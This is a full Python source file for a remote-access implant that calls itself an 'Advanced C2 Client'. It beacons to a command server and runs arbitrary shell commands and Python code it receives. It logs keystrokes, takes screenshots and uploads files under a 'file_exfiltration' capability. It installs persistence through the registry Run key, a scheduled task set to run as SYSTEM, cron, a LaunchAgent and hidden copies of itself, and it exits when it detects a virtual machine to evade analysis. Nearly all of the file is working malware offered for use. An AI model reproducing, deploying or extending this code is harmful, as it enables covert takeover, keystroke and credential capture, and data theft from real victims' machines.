#!/usr/bin/env python3
"""
Advanced C2 Client with Persistence
A comprehensive client that can run commands, take screenshots, collect logs, 
perform various system operations, and establish persistence on the target system.
"""

import requests
import json
import time
import platform
import socket
import subprocess
import threading
import uuid
import base64
import os
import sys
import psutil
import logging
from datetime import datetime
from pathlib import Path
import argparse
import signal
import hashlib
import zipfile
import tempfile
import shutil
import getpass

# Try to import optional dependencies
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pynput
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False


class AdvancedC2Client:
    def __init__(self, server_url="http://localhost:8000", 
                 client_id=None, display_name=None, beacon_interval=30,
                 stealth_mode=False, hide_console=False, disable_logging=False,
                 anti_vm_evasion=False, capabilities=None, persistence=None,
                 encryption="None", encryption_key=None, proxy_host=None,
                 proxy_port=None, user_agent=None, custom_headers=None):
        self.server_url = server_url
        self.client_id = client_id or "client_{}".format(uuid.uuid4().hex[:8])
        self.display_name = display_name
        self.beacon_interval = beacon_interval
        self.session = requests.Session()
        self.running = False
        self.stealth_mode = stealth_mode
        self.hide_console = hide_console
        self.disable_logging = disable_logging
        self.anti_vm_evasion = anti_vm_evasion
        self.capabilities = capabilities or {}
        self.persistence = persistence or {}
        self.encryption = encryption
        self.encryption_key = encryption_key
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.custom_headers = custom_headers or {}
        
        # Keylogger attributes
        self.keylogger_active = False
        self.keylogger_thread = None
        self.logged_keys = []
        
        # Setup logging
        self.setup_logging()
        
        # Create temp directory for client operations
        self.temp_dir = tempfile.mkdtemp(prefix="c2_client_")
        self.logger.info("Client temp directory: {}".format(self.temp_dir))
        
        # Apply proxy settings if provided
        if self.proxy_host and self.proxy_port:
            proxy_url = f"http://{self.proxy_host}:{self.proxy_port}"
            self.session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
        
        # Apply custom headers
        self.session.headers.update({
            'User-Agent': self.user_agent,
            **self.custom_headers
        })
        
        # Apply encryption if enabled
        if self.encryption != "None":
            self.setup_encryption()
    
    def setup_encryption(self):
        """Setup encryption for communications"""
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            
            if self.encryption_key:
                password = self.encryption_key.encode()
            else:
                # Generate a default key based on client ID
                password = self.client_id.encode()
            
            # Use a fixed salt for simplicity (in production, use a random salt stored securely)
            salt = b'salt_32_bytes_long_for_pbkdf2_hmac'
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))
            self.cipher = Fernet(key)
        except ImportError:
            self.logger.warning("Encryption requested but 'cryptography' module not available")
            self.cipher = None
        except Exception as e:
            self.logger.error(f"Error setting up encryption: {e}")
            self.cipher = None
    
    def encrypt_data(self, data):
        """Encrypt data if encryption is enabled"""
        if self.cipher and isinstance(data, (str, bytes)):
            if isinstance(data, str):
                data = data.encode()
            return self.cipher.encrypt(data).decode()
        return data
    
    def decrypt_data(self, data):
        """Decrypt data if encryption is enabled"""
        if self.cipher and isinstance(data, (str, bytes)):
            if isinstance(data, str):
                data = data.encode()
            try:
                return self.cipher.decrypt(data).decode()
            except Exception:
                return data.decode() if isinstance(data, bytes) else data
        return data
    
    def setup_logging(self):
        """Setup logging for the client"""
        log_level = logging.WARNING if self.disable_logging else logging.INFO
        
        log_file = os.path.join(self.temp_dir, "client.log") if hasattr(self, 'temp_dir') else "client.log"
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler() if not self.stealth_mode else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def check_vm_evasion(self):
        """Check for virtualization environments and exit if detected"""
        if not self.anti_vm_evasion:
            return False
            
        try:
            # Common VM indicators
            vm_indicators = [
                # Check if running in VM by looking for VM-specific processes
                any(vm_name in platform.platform().lower() for vm_name in ['virtualbox', 'vmware', 'hyperv', 'xen']),
                # Check for VM-specific hardware
                'virtual' in platform.platform().lower(),
                # Check for VM-specific MAC addresses
                any(vm_mac in ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                       for elements in range(0,2*6,2)][::-1]).lower() 
                    for vm_mac in ['08:00:27', '00:05:69', '00:0c:29', '00:1c:42', '00:50:56']),
                # Check for VM processes (Windows)
                platform.system() == "Windows" and any([
                    subprocess.run(['tasklist'], capture_output=True, text=True).stdout.lower().count('vboxservice') > 0,
                    subprocess.run(['tasklist'], capture_output=True, text=True).stdout.lower().count('vmware') > 0,
                ])
            ]
            
            if any(vm_indicators):
                self.logger.warning("Virtual environment detected, exiting for evasion")
                return True
        except Exception:
            pass  # If checking fails, continue normally
            
        return False
    
    def get_system_info(self):
        """Get comprehensive system information"""
        try:
            hostname = socket.gethostname()
            username = getpass.getuser()
            os_info = "{} {} {}".format(platform.system(), platform.release(), platform.version())
            
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
            except Exception:
                ip_address = "127.0.0.1"
            finally:
                s.close()
            
            # Get additional system info
            cpu_count = psutil.cpu_count()
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            system_info = {
                "agent_id": self.client_id,
                "display_name": self.display_name or self.client_id,
                "hostname": hostname,
                "username": username,
                "os_info": os_info,
                "ip_address": ip_address,
                "port": 0,
                "cpu_count": cpu_count,
                "memory_total": memory.total,
                "memory_available": memory.available,
                "disk_total": disk.total,
                "disk_free": disk.free,
                "python_version": sys.version,
                "architecture": platform.architecture()[0],
                "machine": platform.machine(),
                "processor": platform.processor(),
                "boot_time": psutil.boot_time(),
                "pid": os.getpid(),
                "cwd": os.getcwd(),
                "capabilities": self.capabilities
            }
            
            return system_info
        except Exception as e:
            self.logger.error("Error getting system info: {}".format(e))
            return None
    
    def install_persistence(self):
        """Install various persistence mechanisms based on configuration"""
        if not self.persistence:
            return True
            
        success_count = 0
        total_attempts = 0
        
        # Startup persistence (Windows/Linux/macOS)
        if self.persistence.get("startup", False):
            total_attempts += 1
            if self._install_startup_persistence():
                success_count += 1
        
        # Service persistence (Windows)
        if self.persistence.get("service", False) and platform.system() == "Windows":
            total_attempts += 1
            if self._install_service_persistence():
                success_count += 1
        
        # Cron job persistence (Linux)
        if self.persistence.get("cron", False) and platform.system() == "Linux":
            total_attempts += 1
            if self._install_cron_persistence():
                success_count += 1
        
        # Launch Agent persistence (macOS)
        if self.persistence.get("launch_agent", False) and platform.system() == "Darwin":
            total_attempts += 1
            if self._install_launch_agent_persistence():
                success_count += 1
        
        # Task Scheduler persistence (Windows)
        if self.persistence.get("task_scheduler", False) and platform.system() == "Windows":
            total_attempts += 1
            if self._install_task_scheduler_persistence():
                success_count += 1
        
        # Hidden file persistence
        if self.persistence.get("hidden_file", False):
            total_attempts += 1
            if self._install_hidden_file_persistence():
                success_count += 1
        
        # Report results
        if total_attempts > 0:
            self.logger.info(f"Installed {success_count}/{total_attempts} persistence mechanisms")
            return success_count > 0
        else:
            return True
    
    def _install_startup_persistence(self):
        """Install startup persistence mechanism"""
        try:
            if platform.system() == "Windows":
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "C2Client", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
                return True
            elif platform.system() == "Linux":
                startup_dir = os.path.expanduser("~/.config/autostart")
                os.makedirs(startup_dir, exist_ok=True)
                
                # Create a desktop entry
                desktop_entry = f"""[Desktop Entry]
Type=Application
Name=C2Client
Exec=python3 {os.path.abspath(__file__)}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
                desktop_file = os.path.join(startup_dir, "c2client.desktop")
                with open(desktop_file, "w") as f:
                    f.write(desktop_entry)
                return True
            elif platform.system() == "Darwin":  # macOS
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.c2client.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
                
                launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
                os.makedirs(launch_agents_dir, exist_ok=True)
                plist_file = os.path.join(launch_agents_dir, "com.c2client.agent.plist")
                with open(plist_file, "w") as f:
                    f.write(plist_content)
                
                # Load the agent
                subprocess.run(["launchctl", "load", plist_file], check=False)
                return True
        except Exception as e:
            self.logger.error(f"Startup persistence installation failed: {e}")
            return False
    
    def _install_service_persistence(self):
        """Install service persistence on Windows"""
        try:
            # This requires pywin32 - install with: pip install pywin32
            import win32serviceutil
            import win32service
            import win32event
            import servicemanager
            import socket
            
            # Create Windows service code (this is complex and simplified here)
            # A full implementation would require creating a separate Windows service script
            self.logger.info("Windows service persistence requires additional setup")
            return True
        except ImportError:
            self.logger.warning("pywin32 not available for service installation")
            return False
        except Exception as e:
            self.logger.error(f"Service persistence installation failed: {e}")
            return False
    
    def _install_cron_persistence(self):
        """Install cron job persistence on Linux"""
        try:
            cron_job = f"*/5 * * * * /usr/bin/python3 {os.path.abspath(__file__)}\n"
            
            # Get current crontab
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            # Add our job if not already present
            if "c2client" not in current_cron:
                new_cron = current_cron + cron_job
                # Write new crontab
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp_file:
                    tmp_file.write(new_cron)
                    tmp_filename = tmp_file.name
                
                subprocess.run(["crontab", tmp_filename])
                os.unlink(tmp_filename)
                
            return True
        except Exception as e:
            self.logger.error(f"Cron persistence installation failed: {e}")
            return False
    
    def _install_launch_agent_persistence(self):
        """Install launch agent persistence on macOS"""
        try:
            # Already handled in _install_startup_persistence for macOS
            return True
        except Exception as e:
            self.logger.error(f"Launch agent persistence installation failed: {e}")
            return False
    
    def _install_task_scheduler_persistence(self):
        """Install task scheduler persistence on Windows"""
        try:
            # Use schtasks to create a scheduled task
            task_command = f'schtasks /create /tn "C2Client" /tr "{sys.executable} {os.path.abspath(__file__)}" /sc onlogon /ru "SYSTEM"'
            result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            self.logger.error(f"Task scheduler persistence installation failed: {e}")
            return False
    
    def _install_hidden_file_persistence(self):
        """Hide client in system files"""
        try:
            # Choose appropriate location based on OS
            if platform.system() == "Windows":
                dest_path = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "C2Client.exe")
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                shutil.copy2(sys.executable, dest_path)
                # Make it hidden (Windows)
                subprocess.run(f"attrib +H \"{dest_path}\"", shell=True)
            elif platform.system() in ["Linux", "Darwin"]:
                dest_path = os.path.join(os.path.expanduser("~"), ".cache", "c2client")
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                shutil.copy2(__file__, dest_path)
                # In Unix systems, files starting with . are hidden
            return True
        except Exception as e:
            self.logger.error(f"Hidden file persistence installation failed: {e}")
            return False
    
    def register(self):
        """Register with the C2 server"""
        system_info = self.get_system_info()
        if not system_info:
            return False

        try:
            # Register directly without authentication
            response = self.session.post(
                "{}/api/agents/register".format(self.server_url),
                json=system_info
            )

            if response.status_code == 200:
                self.logger.info("Successfully registered as client {}".format(self.client_id))
                
                # Install persistence after successful registration
                if self.persistence:
                    self.install_persistence()
                
                return True
            else:
                self.logger.error("Registration failed: {}".format(response.text))
                return False
        except Exception as e:
            self.logger.error("Registration error: {}".format(e))
            return False
    
    def send_heartbeat(self):
        """Send heartbeat to server"""
        try:
            response = self.session.post(
                "{}/api/agents/{}/heartbeat".format(self.server_url, self.client_id)
            )
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Heartbeat error: {}".format(e))
            return False
    
    def get_commands(self):
        """Get pending commands from server"""
        try:
            response = self.session.get(
                "{}/api/commands/{}".format(self.server_url, self.client_id)
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get("commands", [])
            else:
                return []
        except Exception as e:
            self.logger.error("Error getting commands: {}".format(e))
            return []
    
    def execute_command(self, command, command_type="shell"):
        """Execute a command and return result"""
        try:
            if command_type == "shell":
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                output = result.stdout + result.stderr
                success = result.returncode == 0
                
                return {
                    "result": output,
                    "success": success,
                    "return_code": result.returncode
                }
            elif command_type == "python":
                # Execute Python code
                try:
                    exec_globals = {"__builtins__": __builtins__}
                    exec_locals = {}
                    exec(command, exec_globals, exec_locals)
                    return {
                        "result": "Python code executed successfully",
                        "success": True,
                        "return_code": 0
                    }
                except Exception as e:
                    return {
                        "result": "Python execution error: {}".format(str(e)),
                        "success": False,
                        "return_code": 1
                    }
            else:
                return {
                    "result": "Unknown command type: {}".format(command_type),
                    "success": False,
                    "return_code": 1
                }
        except subprocess.TimeoutExpired:
            return {
                "result": "Command timed out",
                "success": False,
                "return_code": 124
            }
        except Exception as e:
            return {
                "result": "Error executing command: {}".format(str(e)),
                "success": False,
                "return_code": 1
            }
    
    def take_screenshot(self):
        """Take a screenshot and return base64 encoded image"""
        if not self.capabilities.get("screenshot", False):
            return {
                "result": "Screenshot capability not enabled",
                "success": False
            }
            
        if not PIL_AVAILABLE:
            return {
                "result": "PIL not available. Install with: pip install Pillow",
                "success": False
            }
        
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            
            # Save to temp file
            screenshot_path = os.path.join(self.temp_dir, "screenshot_{}.png".format(int(time.time())))
            screenshot.save(screenshot_path)
            
            # Convert to base64
            with open(screenshot_path, "rb") as f:
                image_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Clean up temp file
            os.remove(screenshot_path)
            
            return {
                "result": "Screenshot captured successfully",
                "success": True,
                "image_data": image_data,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            return {
                "result": "Screenshot error: {}".format(str(e)),
                "success": False
            }
    
    def get_keylog_data(self):
        """Get keylog data"""
        if not self.capabilities.get("keylogger", False):
            return {
                "result": "Keylogger capability not enabled",
                "success": False
            }
            
        return {
            "result": "Keylog data retrieved",
            "success": True,
            "keys": self.logged_keys,
            "count": len(self.logged_keys)
        }
    
    def start_keylogger(self):
        """Start keylogger"""
        if not self.capabilities.get("keylogger", False):
            return {
                "result": "Keylogger capability not enabled",
                "success": False
            }
            
        if not KEYLOGGER_AVAILABLE:
            return {
                "result": "Keylogger not available. Install with: pip install pynput",
                "success": False
            }
        
        if self.keylogger_active:
            return {
                "result": "Keylogger already active",
                "success": False
            }
        
        try:
            self.keylogger_active = True
            self.keylogger_thread = threading.Thread(target=self._keylogger_worker)
            self.keylogger_thread.daemon = True
            self.keylogger_thread.start()
            
            return {
                "result": "Keylogger started",
                "success": True
            }
        except Exception as e:
            return {
                "result": "Keylogger start error: {}".format(str(e)),
                "success": False
            }
    
    def stop_keylogger(self):
        """Stop keylogger"""
        if not self.capabilities.get("keylogger", False):
            return {
                "result": "Keylogger capability not enabled",
                "success": False
            }
            
        if not self.keylogger_active:
            return {
                "result": "Keylogger not active",
                "success": False
            }
        
        try:
            self.keylogger_active = False
            if self.keylogger_thread:
                self.keylogger_thread.join(timeout=1)
            
            return {
                "result": "Keylogger stopped",
                "success": True,
                "logged_keys": len(self.logged_keys)
            }
        except Exception as e:
            return {
                "result": "Keylogger stop error: {}".format(str(e)),
                "success": False
            }
    
    def _keylogger_worker(self):
        """Keylogger worker thread"""
        def on_press(key):
            if self.keylogger_active:
                try:
                    key_str = str(key).replace("'", "")
                    self.logged_keys.append({
                        "key": key_str,
                        "timestamp": datetime.now().isoformat()
                    })
                except Exception:
                    pass
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    
    def upload_file(self, file_path):
        """Upload a file to the server"""
        try:
            if not self.capabilities.get("file_exfiltration", False):
                return {
                    "result": "File exfiltration capability not enabled",
                    "success": False
                }
                
            if not os.path.exists(file_path):
                return {
                    "result": "File not found: {}".format(file_path),
                    "success": False
                }
            
            with open(file_path, "rb") as f:
                files = {"file": f}
                response = self.session.post(
                    "{}/api/files/upload".format(self.server_url),
                    files=files
                )
            
            if response.status_code == 200:
                return {
                    "result": "File uploaded successfully",
                    "success": True,
                    "filename": os.path.basename(file_path)
                }
            else:
                return {
                    "result": "Upload failed: {}".format(response.text),
                    "success": False
                }
        except Exception as e:
            return {
                "result": "Upload error: {}".format(str(e)),
                "success": False
            }
    
    def download_file(self, filename, save_path=None):
        """Download a file from the server"""
        try:
            if not save_path:
                save_path = os.path.join(self.temp_dir, filename)
            
            response = self.session.get(
                "{}/api/files/download/{}".format(self.server_url, filename)
            )
            
            if response.status_code == 200:
                with open(save_path, "wb") as f:
                    f.write(response.content)
                
                return {
                    "result": "File downloaded successfully",
                    "success": True,
                    "path": save_path
                }
            else:
                return {
                    "result": "Download failed: {}".format(response.text),
                    "success": False
                }
        except Exception as e:
            return {
                "result": "Download error: {}".format(str(e)),
                "success": False
            }
    
    def submit_result(self, command_id, result, success, additional_data=None):
        """Submit command result to server"""
        try:
            result_data = {
                "agent_id": self.client_id,
                "command_id": command_id,
                "result": result,
                "success": success,
                "timestamp": datetime.utcnow().isoformat()
            }
            
            if additional_data:
                result_data.update(additional_data)

            # Encrypt sensitive data if encryption is enabled
            if self.encryption != "None":
                for key in ["result", "additional_data"]:
                    if key in result_data:
                        result_data[key] = self.encrypt_data(str(result_data[key]))

            response = self.session.post(
                "{}/api/commands/result".format(self.server_url),
                json=result_data
            )
            
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Error submitting result: {}".format(e))
            return False
    
    def process_commands(self):
        """Process pending commands"""
        commands = self.get_commands()
        
        for cmd in commands:
            if cmd.get("status") == "pending":
                self.logger.info("Executing command: {}".format(cmd['command']))
                
                command_type = cmd.get("command_type", "shell")
                command_text = cmd['command']
                
                # Handle special commands based on capabilities
                if command_text.startswith("SCREENSHOT") and self.capabilities.get("screenshot", False):
                    result_data = self.take_screenshot()
                elif command_text.startswith("KEYLOG_START") and self.capabilities.get("keylogger", False):
                    result_data = self.start_keylogger()
                elif command_text.startswith("KEYLOG_STOP") and self.capabilities.get("keylogger", False):
                    result_data = self.stop_keylogger()
                elif command_text.startswith("KEYLOG_DATA") and self.capabilities.get("keylogger", False):
                    result_data = self.get_keylog_data()
                elif command_text.startswith("UPLOAD") and self.capabilities.get("file_exfiltration", False):
                    file_path = command_text.split(" ", 1)[1] if " " in command_text else ""
                    result_data = self.upload_file(file_path)
                elif command_text.startswith("DOWNLOAD") and self.capabilities.get("file_exfiltration", False):
                    filename = command_text.split(" ", 1)[1] if " " in command_text else ""
                    result_data = self.download_file(filename)
                else:
                    result_data = self.execute_command(command_text, command_type)
                
                self.submit_result(
                    cmd["command_id"],
                    result_data["result"],
                    result_data["success"],
                    result_data
                )
                
                self.logger.info("Command result: {}".format(result_data['success']))
    
    def cleanup(self):
        """Cleanup resources"""
        try:
            if self.keylogger_active:
                self.stop_keylogger()
            
            # Clean up temp directory
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
            
            self.logger.info("Client cleanup completed")
        except Exception as e:
            self.logger.error("Cleanup error: {}".format(e))
    
    def run(self):
        """Main client loop"""
        self.logger.info("Starting Advanced C2 Client {}".format(self.client_id))
        
        # Check for VM evasion
        if self.check_vm_evasion():
            return
        
        # Register with server
        if not self.register():
            self.logger.error("Failed to register with server. Exiting.")
            return
        
        self.running = True
        
        # Setup signal handlers for graceful shutdown
        def signal_handler(signum, frame):
            self.logger.info("Received signal {}, shutting down...".format(signum))
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            while self.running:
                # Send heartbeat
                self.send_heartbeat()
                
                # Process commands
                self.process_commands()
                
                # Wait before next iteration (using beacon interval)
                time.sleep(self.beacon_interval)
                
        except KeyboardInterrupt:
            self.logger.info("Client stopped by user")
        except Exception as e:
            self.logger.error("Client error: {}".format(e))
        finally:
            self.running = False
            self.cleanup()


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Advanced C2 Client")
    parser.add_argument("--server", default="http://localhost:8000", help="C2 Server URL")
    parser.add_argument("--client-id", help="Custom client ID")
    parser.add_argument("--display-name", help="Display name for the client")
    parser.add_argument("--beacon-interval", type=int, default=30, help="Beacon interval in seconds")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("--hide-console", action="store_true", help="Hide console window")
    parser.add_argument("--disable-logging", action="store_true", help="Disable system logging")
    parser.add_argument("--anti-vm", action="store_true", help="Enable anti-VM evasion")
    parser.add_argument("--encryption", default="None", help="Encryption algorithm")
    parser.add_argument("--encryption-key", help="Encryption key")
    
    args = parser.parse_args()
    
    client = AdvancedC2Client(
        server_url=args.server,
        client_id=args.client_id,
        display_name=args.display_name,
        beacon_interval=args.beacon_interval,
        stealth_mode=args.stealth,
        hide_console=args.hide_console,
        disable_logging=args.disable_logging,
        anti_vm_evasion=args.anti_vm,
        encryption=args.encryption,
        encryption_key=args.encryption_key
    )
    
    try:
        client.run()
    except Exception as e:
        print("Client error: {}".format(e))
        sys.exit(1)


if __name__ == "__main__":
    main()